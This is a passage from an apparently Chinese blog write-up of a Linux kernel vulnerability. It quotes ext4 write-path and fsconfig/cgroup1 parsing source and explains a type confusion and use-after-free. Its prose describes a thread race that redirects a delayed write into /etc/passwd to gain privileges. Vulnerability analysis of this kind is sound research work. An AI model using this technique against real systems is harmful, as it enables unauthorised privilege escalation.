href="https://elixir.bootlin.com/linux/v5.13.3/source/fs/read_write.c#L928">vfs_writev</a>-&gt;<a href="https://elixir.bootlin.com/linux/v5.13.3/source/fs/read_write.c#L847">do_iter_write</a>-&gt;<a href="https://elixir.bootlin.com/linux/v5.13.3/source/fs/read_write.c#L725">do_iter_readv_writev</a>-&gt;<a href="https://elixir.bootlin.com/linux/v5.13.3/source/include/linux/fs.h#L2111">call_write_iter</a>-&gt;<a href="https://elixir.bootlin.com/linux/v5.13.3/source/fs/ext4/file.c#L915">.write_iter</a> -&gt; <a href="https://elixir.bootlin.com/linux/v5.13.3/source/fs/ext4/file.c#L666">ext4_file_write_iter</a> -&gt; <a href="https://elixir.bootlin.com/linux/v5.13.3/source/fs/ext4/file.c#L253">ext4_buffered_write_iter</a></p><p>在这个函数里面可以看到我注释的两个位置分别对文件节点进行了上锁和解锁。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">    <span class="title function_">ext4_file_write_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(iocb-&gt;ki_filp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(ext4_forced_shutdown(EXT4_SB(inode-&gt;i_sb))))</span><br><span class="line">        <span class="keyword">return</span> -EIO;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FS_DAX</span></span><br><span class="line">    <span class="keyword">if</span> (IS_DAX(inode))</span><br><span class="line">        <span class="keyword">return</span> ext4_dax_write_iter(iocb, from);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT)</span><br><span class="line">        <span class="keyword">return</span> ext4_dio_write_iter(iocb, from);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> ext4_buffered_write_iter(iocb, from);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">ext4_buffered_write_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb,</span></span><br><span class="line"><span class="params">                                        <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ssize_t</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(iocb-&gt;ki_filp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_NOWAIT)</span><br><span class="line">        <span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">    ext4_fc_start_update(inode);</span><br><span class="line">    inode_lock(inode);<span class="comment">//这里会上锁</span></span><br><span class="line">    ret = ext4_write_checks(iocb, from);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    current-&gt;backing_dev_info = inode_to_bdi(inode);</span><br><span class="line">    ret = generic_perform_write(iocb-&gt;ki_filp, from, iocb-&gt;ki_pos);</span><br><span class="line">    current-&gt;backing_dev_info = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    out:</span><br><span class="line">    inode_unlock(inode);<span class="comment">//这里会解锁</span></span><br><span class="line">    ext4_fc_stop_update(inode);</span><br><span class="line">    <span class="keyword">if</span> (likely(ret &gt; <span class="number">0</span>)) &#123;</span><br><span class="line">        iocb-&gt;ki_pos += ret;</span><br><span class="line">        ret = generic_write_sync(iocb, ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时两个线程会卡在这个锁里，翻一翻时间节点，此时权限校验已经完了，第一个线程写入大量数据将第二个线程获取锁的时间，趁此机会第三个线程将 <code>/etc/passwd</code> 打开并将文件页面以这个 <code>uaf</code> 的页面使用，第二个线程获取锁之后直接将数据写入 <code>/etc/passwd</code>。 </p><p>所以要彻底明白这个漏洞，还需要理解前面 UAF 的成因。</p><h3 id="fsconfig"><a href="#fsconfig" class="headerlink" title="fsconfig"></a>fsconfig</h3><p>这个系统调用太大了，只介绍它原有的含义和触发漏洞的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(fsconfig,</span><br><span class="line">                <span class="type">int</span>, fd,</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">int</span>, cmd,</span><br><span class="line">                <span class="type">const</span> <span class="type">char</span> __user *, _key,</span><br><span class="line">                <span class="type">const</span> <span class="type">void</span> __user *, _value,</span><br><span class="line">                <span class="type">int</span>, aux)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">int</span> lookup_flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fs_parameter</span> <span class="title">param</span> =</span> &#123;</span><br><span class="line">        .type= fs_value_is_undefined,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_SET_FLAG:</span><br><span class="line">            <span class="keyword">if</span> (!_key || _value || aux)</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line">            <span class="keyword">if</span> (!_key || !_value || aux)</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line">            <span class="keyword">if</span> (!_key || !_value || aux &lt;= <span class="number">0</span> || aux &gt; <span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line">            <span class="keyword">if</span> (!_key || !_value || (aux != AT_FDCWD &amp;&amp; aux &lt; <span class="number">0</span>))</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">            <span class="keyword">if</span> (!_key || _value || aux &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_CMD_CREATE:</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_CMD_RECONFIGURE:</span><br><span class="line">            <span class="keyword">if</span> (_key || _value || aux)</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    f = fdget(fd);</span><br><span class="line">    <span class="keyword">if</span> (!f.file)</span><br><span class="line">        <span class="keyword">return</span> -EBADF;</span><br><span class="line">    ret = -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (f.file-&gt;f_op != &amp;fscontext_fops)</span><br><span class="line">        <span class="keyword">goto</span> out_f;</span><br><span class="line"></span><br><span class="line">    fc = f.file-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (fc-&gt;ops == &amp;legacy_fs_context_ops) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">            <span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line">            <span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line">            <span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line">            <span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">                ret = -EOPNOTSUPP;</span><br><span class="line">                <span class="keyword">goto</span> out_f;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_key) &#123;</span><br><span class="line">        param.key = strndup_user(_key, <span class="number">256</span>);</span><br><span class="line">        <span class="keyword">if</span> (IS_ERR(param.key)) &#123;</span><br><span class="line">            ret = PTR_ERR(param.key);</span><br><span class="line">            <span class="keyword">goto</span> out_f;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_SET_FLAG:</span><br><span class="line">            param.type = fs_value_is_flag;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line">            param.type = fs_value_is_string;</span><br><span class="line">            param.<span class="built_in">string</span> = strndup_user(_value, <span class="number">256</span>);</span><br><span class="line">            <span class="keyword">if</span> (IS_ERR(param.<span class="built_in">string</span>)) &#123;</span><br><span class="line">                ret = PTR_ERR(param.<span class="built_in">string</span>);</span><br><span class="line">                <span class="keyword">goto</span> out_key;</span><br><span class="line">            &#125;</span><br><span class="line">            param.size = <span class="built_in">strlen</span>(param.<span class="built_in">string</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line">            param.type = fs_value_is_blob;</span><br><span class="line">            param.size = aux;</span><br><span class="line">            param.blob = memdup_user_nul(_value, aux);</span><br><span class="line">            <span class="keyword">if</span> (IS_ERR(param.blob)) &#123;</span><br><span class="line">                ret = PTR_ERR(param.blob);</span><br><span class="line">                <span class="keyword">goto</span> out_key;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line">            lookup_flags = LOOKUP_EMPTY;</span><br><span class="line">            fallthrough;</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line">            param.type = fs_value_is_filename;</span><br><span class="line">            param.name = getname_flags(_value, lookup_flags, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (IS_ERR(param.name)) &#123;</span><br><span class="line">                ret = PTR_ERR(param.name);</span><br><span class="line">                <span class="keyword">goto</span> out_key;</span><br><span class="line">            &#125;</span><br><span class="line">            param.dirfd = aux;</span><br><span class="line">            param.size = <span class="built_in">strlen</span>(param.name-&gt;name);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">            param.type = fs_value_is_file;</span><br><span class="line">            ret = -EBADF;</span><br><span class="line">            param.file = fget(aux);</span><br><span class="line">            <span class="keyword">if</span> (!param.file)</span><br><span class="line">                <span class="keyword">goto</span> out_key;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">        ret = vfs_fsconfig_locked(fc, cmd, &amp;param);</span><br><span class="line">        mutex_unlock(&amp;fc-&gt;uapi_mutex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Clean up the our record of any value that we obtained from</span></span><br><span class="line"><span class="comment"> * userspace.  Note that the value may have been stolen by the LSM or</span></span><br><span class="line"><span class="comment"> * filesystem, in which case the value pointer will have been cleared.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line">            kfree(param.<span class="built_in">string</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line">            <span class="keyword">if</span> (param.name)</span><br><span class="line">                putname(param.name);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">            <span class="keyword">if</span> (param.file)</span><br><span class="line">                fput(param.file);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    out_key:</span><br><span class="line">    kfree(param.key);</span><br><span class="line">    out_f:</span><br><span class="line">    fdput(f);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个系统调用允许挂载自己的文件系统而不用修改内核，它在调用的过程中存在类型混淆漏洞。</p><p>在选项 5 有个可以释放文件的操作 <code>FSCONFIG_SET_FD</code>，在解释参数的时候，会调用到下面的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vfs_parse_fs_param</span><span class="params">(<span class="keyword">struct</span> fs_context *fc, <span class="keyword">struct</span> fs_parameter *param)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!param-&gt;key)</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;Unnamed parameter\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">ret = vfs_parse_sb_flag(fc, param-&gt;key);</span><br><span class="line"><span class="keyword">if</span> (ret != -ENOPARAM)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">ret = security_fs_context_parse_param(fc, param);</span><br><span class="line"><span class="keyword">if</span> (ret != -ENOPARAM)</span><br><span class="line"><span class="comment">/* Param belongs to the LSM or is disallowed by the LSM; so</span></span><br><span class="line"><span class="comment"> * don&#x27;t pass to the FS.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;</span><br><span class="line">ret = fc-&gt;ops-&gt;parse_param(fc, param);<span class="comment">//这个地方调用了cgroup1_parse_param</span></span><br><span class="line"><span class="keyword">if</span> (ret != -ENOPARAM)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If the filesystem doesn&#x27;t take any arguments, give it the</span></span><br><span class="line"><span class="comment"> * default handling of source.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(param-&gt;key, <span class="string">&quot;source&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (param-&gt;type != fs_value_is_string)</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Non-string source&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fc-&gt;source)</span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Multiple sources&quot;</span>);</span><br><span class="line">fc-&gt;source = param-&gt;<span class="built_in">string</span>;</span><br><span class="line">param-&gt;<span class="built_in">string</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> invalf(fc, <span class="string">&quot;%s: Unknown parameter &#x27;%s&#x27;&quot;</span>,</span><br><span class="line">      fc-&gt;fs_type-&gt;name, param-&gt;key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cgroup1_parse_param</span><span class="params">(<span class="keyword">struct</span> fs_context *fc, <span class="keyword">struct</span> fs_parameter *param)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cgroup_fs_context</span> *<span class="title">ctx</span> =</span> cgroup_fc2context(fc);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cgroup_subsys</span> *<span class="title">ss</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fs_parse_result</span> <span class="title">result</span>;</span></span><br><span class="line">    <span class="type">int</span> opt, i;</span><br><span class="line"></span><br><span class="line">    opt = fs_parse(fc, cgroup1_fs_parameters, param, &amp;result);</span><br><span class="line">    <span class="keyword">if</span> (opt == -ENOPARAM) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(param-&gt;key, <span class="string">&quot;source&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (fc-&gt;source)</span><br><span class="line">                <span class="keyword">return</span> invalf(fc, <span class="string">&quot;Multiple sources not supported&quot;</span>);</span><br><span class="line">            fc-&gt;source = param-&gt;<span class="built_in">string</span>;</span><br><span class="line">            param-&gt;<span class="built_in">string</span> = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        for_each_subsys(ss, i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(param-&gt;key, ss-&gt;legacy_name))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (!cgroup_ssid_enabled(i) || cgroup1_ssid_disabled(i))</span><br><span class="line">                <span class="keyword">return</span> invalfc(fc, <span class="string">&quot;Disabled controller &#x27;%s&#x27;&quot;</span>,</span><br><span class="line">                               param-&gt;key);</span><br><span class="line">            ctx-&gt;subsys_mask |= (<span class="number">1</span> &lt;&lt; i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> invalfc(fc, <span class="string">&quot;Unknown subsys name &#x27;%s&#x27;&quot;</span>, param-&gt;key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (opt &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> opt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opt_none:</span><br><span class="line">            <span class="comment">/* Explicitly have no subsystems */</span></span><br><span class="line">            ctx-&gt;none = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opt_all:</span><br><span class="line">            ctx-&gt;all_ss = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opt_noprefix:</span><br><span class="line">            ctx-&gt;flags |= CGRP_ROOT_NOPREFIX;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opt_clone_children:</span><br><span class="line">            ctx-&gt;cpuset_clone_children = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opt_cpuset_v2_mode:</span><br><span class="line">            ctx-&gt;flags |= CGRP_ROOT_CPUSET_V2_MODE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opt_xattr:</span><br><span class="line">            ctx-&gt;flags |= CGRP_ROOT_XATTR;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opt_release_agent:</span><br><span class="line">            <span class="comment">/* Specifying two release agents is forbidden */</span></span><br><span class="line">            <span class="keyword">if</span> (ctx-&gt;release_agent)</span><br><span class="line">                <span class="keyword">return</span> invalfc(fc, <span class="string">&quot;release_agent respecified&quot;</span>);</span><br><span class="line">            ctx-&gt;release_agent = param-&gt;<span class="built_in">string</span>;</span><br><span class="line">            param-&gt;<span class="built_in">string</span> = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opt_name:</span><br><span class="line">            <span class="comment">/* blocked by boot param? */</span></span><br><span class="line">            <span class="keyword">if</span> (cgroup_no_v1_named)</span><br><span class="line">                <span class="keyword">return</span> -ENOENT;</span><br><span class="line">            <span class="comment">/* Can&#x27;t specify an empty name */</span></span><br><span class="line">            <span class="keyword">if</span> (!param-&gt;size)</span><br><span class="line">                <span class="keyword">return</span> invalfc(fc, <span class="string">&quot;Empty name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (param-&gt;size &gt; MAX_CGROUP_ROOT_NAMELEN - <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> invalfc(fc, <span class="string">&quot;Name too long&quot;</span>);</span><br><span class="line">            <span class="comment">/* Must match [\w.-]+ */</span></span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; param-&gt;size; i++) &#123;</span><br><span class="line">                <span class="type">char</span> c = param-&gt;<span class="built_in">string</span>[i];</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">isalnum</span>(c))</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span> ((c == <span class="string">&#x27;.&#x27;</span>) || (c == <span class="string">&#x27;-&#x27;</span>) || (c == <span class="string">&#x27;_&#x27;</span>))</span><br><span 